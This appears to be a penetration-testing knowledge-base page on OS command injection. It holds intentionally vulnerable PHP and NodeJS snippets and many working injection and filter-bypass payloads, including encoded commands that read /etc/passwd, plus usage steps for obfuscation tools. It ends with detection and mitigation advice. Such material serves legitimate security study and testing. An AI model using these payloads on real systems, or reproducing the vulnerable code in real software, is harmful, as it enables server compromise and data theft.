---
title: "Command Injection"
category: "techniques"
tags: []
excerpt: "Command injection exploits unsanitized user input passed to OS command execution functions on the back-end server. An..."
date: "2026-06-22"
---

---
## Overview
Command injection exploits unsanitized user input passed to OS command execution functions on the back-end server. An attacker appends shell metacharacters to break out of the intended command and run arbitrary OS commands — potentially leading to full server compromise. Ranked #3 in OWASP's Top 10. Even when blacklists and WAFs are present, obfuscation and alternative shell syntax frequently provide a bypass path.

---
## When To Use
- Application appears to trigger OS-level behavior based on user input (ping output, DNS results, file creation, archive extraction)
- Error messages contain shell context clues (command not found, permission denied from a web response)
- Input fields accept IP addresses, hostnames, filenames, or other values that could reach a system call

## Requirements
- A parameter whose value reaches an OS command execution function on the server
- Ability to deliver arbitrary values to the back-end (directly or by bypassing front-end validation via a proxy)

Back-end languages expose several functions that run OS commands directly. When user input is concatenated into these calls without sanitization, the input becomes part of the shell command.

Vulnerable functions by language:

| Language | Vulnerable Functions |
|---|---|
| PHP | `exec`, `system`, `shell_exec`, `passthru`, `popen` |
| NodeJS | `child_process.exec`, `child_process.spawn` |
| Python | `os.system`, `subprocess.call` with `shell=True` |
| Java | `Runtime.exec` |

PHP example — filename parameter inserted directly into `touch`:

```php
if (isset($_GET['filename'])) {
    system("touch /tmp/" . $_GET['filename'] . ".pdf");
}
```

NodeJS equivalent:
```javascript
app.get("/createfile", function(req, res){
    child_process.exec(`touch /tmp/${req.query.filename}.txt`);
})
```

Supplying `; whoami` as the filename breaks out of the intended command in both cases. Command injection also affects non-web binaries and thick clients that pass unsanitized input to shell functions.

---
## Attack Steps

### 1. Identify the Injection Point
Find functionality where the application visibly or implicitly executes a system command — ping/reachability checkers, file processors, report generators, DNS lookups. Submit a normal value and confirm OS-level output appears in the response.

If the browser blocks input at the field level (front-end validation — no network request fires), bypass via [Burp Suite](/tools/Web-Testing/Burp-Suite/Burp-Suite) or [OWASP ZAP](/tools/Web-Testing/OWASP-ZAP/OWASP-ZAP): intercept a valid working request, send to Repeater, then modify the parameter value manually.

### 2. Test Injection Operators
Append an operator and a test command. The operator determines what executes and in what order.

| Operator | Character | URL-Encoded | Behavior |
|---|---|---|---|
| Semicolon | `;` | `%3b` | Both commands run |
| New Line | `\n` | `%0a` | Both commands run; rarely blacklisted |
| Background | `&` | `%26` | Both run; second output shown first |
| Pipe | `\|` | `%7c` | Both run; only second output shown |
| AND | `&&` | `%26%26` | Second runs only if first succeeds |
| OR | `\|\|` | `%7c%7c` | Second runs only if first fails |
| Sub-Shell | ` `` ` | `%60%60` | Both run **(Linux only)** |
| Sub-Shell | `$()` | `%24%28%29` | Both run **(Linux only)** |

Example: `127.0.0.1; whoami` — runs ping then `whoami` if `;` is permitted.

OR operator trick: if you cannot get both commands to execute, strip the first value entirely and test `|| whoami` — the first (empty) command fails, triggering the second.

Always test payloads locally before sending them to the target to confirm the syntax works.

### 3. Identify Filters
If the operator triggers an "Invalid input" error in the page body (not a WAF block page), the application has a character blacklist. Reduce the payload one token at a time to isolate which character is caught:
- Test `127.0.0.1;` — if blocked, `;` is blacklisted
- Test `127.0.0.1\n` (`%0a`) — new-line is rarely blacklisted and works as a separator on both Linux and Windows

A WAF block typically presents a different page entirely, often showing your IP or a request ID.

### 4. Bypass Blacklisted Operators
New-line (`%0a`) is the most reliable alternative separator. If new-line clears the filter, append commands using `127.0.0.1%0a<command>`.

### 5. Bypass Space Filters
If spaces after the operator are blocked, substitute one of the following:

| Technique | Payload | Platform |
|---|---|---|
| Tab | `%09` | Linux + Windows |
| `$IFS` environment variable | `${IFS}` | Linux only |
| Bash brace expansion | `{ls,-la}` | Linux bash only |

Examples:
- `127.0.0.1%0a%09whoami` — newline + tab separator
- `127.0.0.1%0a${IFS}whoami` — newline + IFS space
- `127.0.0.1%0a{ls,-la}` — brace expansion, no space needed

### 6. Bypass Blacklisted Characters
When `/` or `\` (or other characters) are filtered, extract them from shell environment variables rather than typing them directly.

#### Linux — Environment Variable Slicing
`${VAR:offset:length}` extracts a substring of any environment variable:
- `echo ${PATH:0:1}` → `/` (first char of `/usr/local/bin:...`)
- `echo ${LS_COLORS:10:1}` → `;`

Use `printenv` (injected via a previous command) to list all available variables and find the character and offset you need.

Example full payload — semicolon + space without using either character:
`127.0.0.1${LS_COLORS:10:1}${IFS}whoami`

#### Windows — CMD Variable Slicing
`%VAR:~start,length%` extracts characters from a Windows environment variable:
- `echo %HOMEPATH:~6,-11%` → `\` (from `\Users\htb-student`; negative index reads from right)

#### Windows — PowerShell Array Indexing
Strings are character arrays in PowerShell:
- `$env:HOMEPATH[0]` → `\`
- `Get-ChildItem Env:` → list all environment variables to find the character you need

#### Linux — Character Shifting
`tr` shifts characters by 1 in ASCII — find the character one position before the needed one in the ASCII table (`man ascii`) and shift it:
`echo $(tr '!-}' '"-~'<<<[)` → prints `\` (`[` is ASCII 91, `\` is ASCII 92)

### 7. Bypass Blacklisted Commands
When specific command names (`whoami`, `cat`, `id`, etc.) are filtered by exact string match, obfuscate them so the shell strips the added characters but the filter does not see the original word.

#### Quote Insertion (Linux and Windows)
Single or double quotes inside a command name are stripped by the shell before execution:
- `w'h'o'a'm'i` → executes as `whoami`
- `w"h"o"a"m"i` → executes as `whoami`
- Quotes must be paired (even number, same type, not mixed)

#### Backslash and `$@` (Linux only)
Bash ignores these characters inside a command name:
- `w\ho\am\i` → `whoami`
- `who$@ami` → `whoami`

#### Caret (Windows CMD only)
CMD ignores carets within command names:
- `who^ami` → `whoami`

### 8. Advanced Obfuscation
Use when quote-based tricks are caught by a WAF or more sophisticated pattern matching.

#### Case Manipulation
Windows commands are case-insensitive. On Linux, convert to lowercase at execution time:
- Windows: `WhOaMi` → works natively
- Linux: `$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")` → converts before execution
- Linux alternative: `$(a="WhOaMi";printf %s "${a,,}")`

If spaces in the conversion command are also filtered, replace them with `%09`.

#### Reversed Commands
Reverse the command string and reverse it again at execution time:
- Linux — get reversed string: `echo 'whoami' | rev` → `imaohw`
- Linux — execute: `$(rev<<<'imaohw')`
- Windows — get reversed string: `"whoami"[-1..-20] -join ''`
- Windows — execute: `iex "$('imaohw'[-1..-20] -join '')"`

#### Encoded Commands
Base64-encode the payload to bypass any character-based filter and survive URL-decoding in transit. Build the payload locally rather than copying online to better evade signature detection.

Linux:
- Encode: `echo -n 'cat /etc/passwd | grep 33' | base64`
- Execute: `bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)`
- `<<<` replaces `|` to avoid the pipe character being filtered
- Alternatives: `sh` instead of `bash`; `xxd` for hex encoding; `openssl` for base64

Windows PowerShell:
- Encode: `[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))`
- Execute: `iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"`

Converting Linux base64 to Windows-compatible UTF-16LE format (required by PowerShell):
`echo -n whoami | iconv -f utf-8 -t utf-16le | base64`

### 9. Automated Evasion Tools
Use when manual obfuscation is insufficient against advanced WAF rule sets.

#### bashfuscator (Linux)
Obfuscates bash commands. Default settings can produce payloads exceeding a million characters — use `-s 1 -t 1 --no-mangling --layers 1` to keep output manageable.

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>bashfuscator Installation and Usage:</span></summary>
<div class="callout-body">

<ul class="callout-list">
  <li><code>git clone https://github.com/Bashfuscator/Bashfuscator</code></li>
  <li><code>cd Bashfuscator</code></li>
  <li><code>pip3 install setuptools==65</code></li>
  <li><code>python3 setup.py install --user</code></li>
</ul>

<ul class="callout-list">
  <li><code>cd ./bashfuscator/bin/</code></li>
  <li><code>./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1</code></li>
</ul>

Test the output locally:
<ul class="callout-list">
  <li><code>bash -c '<obfuscated output here>'</code></li>
</ul>

</div>
</details>

#### DOSfuscation (Windows)
Interactive obfuscation tool for Windows CMD commands. Can run on Linux via `pwsh` if no Windows VM is available.

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>DOSfuscation Installation and Usage:</span></summary>
<div class="callout-body">

<ul class="callout-list">
  <li><code>git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git</code></li>
  <li><code>cd Invoke-DOSfuscation</code></li>
  <li><code>Import-Module .\Invoke-DOSfuscation.psd1</code></li>
  <li><code>Invoke-DOSfuscation</code></li>
</ul>

Inside the tool:
<code>help</code>   — show options
<code>tutorial</code>   — see an example walkthrough

Example session:
<ul class="callout-list">
  <li><code>SET COMMAND type C:\Users\<username>\Desktop\flag.txt</code></li>
  <li><code>encoding</code></li>
  <li><code>1</code></li>
</ul>

On Linux without a Windows VM: run <code>pwsh</code> first, then follow the same steps.

</div>
</details>

---
## Detection
From a defender's perspective, command injection leaves observable indicators:
- Unusual processes spawned by the web server user (`www-data`, `apache`, `nginx`) — parent/child process anomalies in Sysmon Event ID 1
- Outbound network connections from the web server process (reverse shell attempts)
- Web server user accessing sensitive files (`/etc/passwd`, SSH keys, `.env` files) in audit logs
- Short, high-entropy process names or base64 strings in web server process arguments
- WAF logs showing blocked payloads with shell metacharacters (`;`, `|`, `&&`, `\n`, `` ` ``, `$()`) or encoded strings

## Mitigation
Primary defense: never pass user input directly to OS command execution functions. Use language-native equivalents (e.g., PHP's `fsockopen()` for host reachability checks).

If OS commands are unavoidable:
- **Validate** input format on both front-end and back-end against a strict whitelist (e.g., `FILTER_VALIDATE_IP` in PHP, regex in NodeJS)
- **Sanitize** by stripping all non-permitted characters — whitelist alphanumeric only where possible (`preg_replace('/[^A-Za-z0-9.]/', '', $input)`)
- **Do not rely on blacklists** — they are bypassable via encoding, case manipulation, and alternative shell syntax
- **Run the web server as a low-privileged user** (`www-data`) — Principle of Least Privilege limits blast radius
- **Disable dangerous functions** in PHP: `disable_functions = system, exec, shell_exec, passthru`
- **Restrict filesystem scope**: `open_basedir = '/var/www/html'` in PHP
- **Deploy a WAF** (Apache `mod_security`, Cloudflare, Fortinet) as an additional detection and blocking layer

---
## Related Knowledge
- [OWASP Top 10 - 2021](/knowledge/Web-Security/OWASP-Top-10---2021)
- [Website Innerworkings](/knowledge/Web-Security/Website-Innerworkings)

## Related Playbook
- [Linux Pentest Playbook](/playbooks/Linux-Pentest-Playbook)

## Related Tools
- [Burp Suite](/tools/Web-Testing/Burp-Suite/Burp-Suite)
- [OWASP ZAP](/tools/Web-Testing/OWASP-ZAP/OWASP-ZAP)

---
## References / Images
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection
- https://www.cobalt.io/blog/a-pentesters-guide-to-command-injection
- https://owasp.org/www-community/attacks/Command_Injection
